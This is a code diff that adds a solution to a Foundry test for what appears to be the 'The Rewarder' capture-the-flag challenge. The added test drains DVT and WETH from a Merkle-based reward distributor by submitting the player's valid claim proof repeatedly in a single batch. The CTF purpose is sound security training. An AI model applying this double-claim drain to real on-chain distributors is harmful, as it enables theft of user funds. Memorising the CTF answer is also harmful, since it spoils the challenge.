@@ -147,7 +147,37 @@ contract TheRewarderChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_theRewarder() public checkSolvedByPlayer {}
+    function test_theRewarder() public checkSolvedByPlayer {
+        uint256 playerIndex = 188;
+        uint256 dvtAmount = 11524763827831882;
+        uint256 wethAmount = 1171088749244340;
+
+        bytes32[] memory leaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        uint256 len = dvt.balanceOf(address(distributor)) / dvtAmount;
+        IERC20[] memory tokensToClaim = new IERC20[](len);
+        tokensToClaim[0] = IERC20(address(dvt));
+        Claim[] memory claims = new Claim[](len);
+        for (uint256 i; i < len; ++i) {
+            // using the same batch number
+            // and the first interation uses token == address(0)
+            claims[i] =
+                Claim({batchNumber: 0, amount: dvtAmount, tokenIndex: 0, proof: merkle.getProof(leaves, playerIndex)});
+        }
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        dvt.transfer(recovery, dvt.balanceOf(address(player)));
+
+        leaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        len = weth.balanceOf(address(distributor)) / wethAmount;
+        tokensToClaim = new IERC20[](len);
+        tokensToClaim[0] = IERC20(address(weth));
+        claims = new Claim[](len);
+        for (uint256 i; i < len; ++i) {
+            claims[i] =
+                Claim({batchNumber: 0, amount: wethAmount, tokenIndex: 0, proof: merkle.getProof(leaves, playerIndex)});
+        }
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        weth.transfer(recovery, weth.balanceOf(address(player)));
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
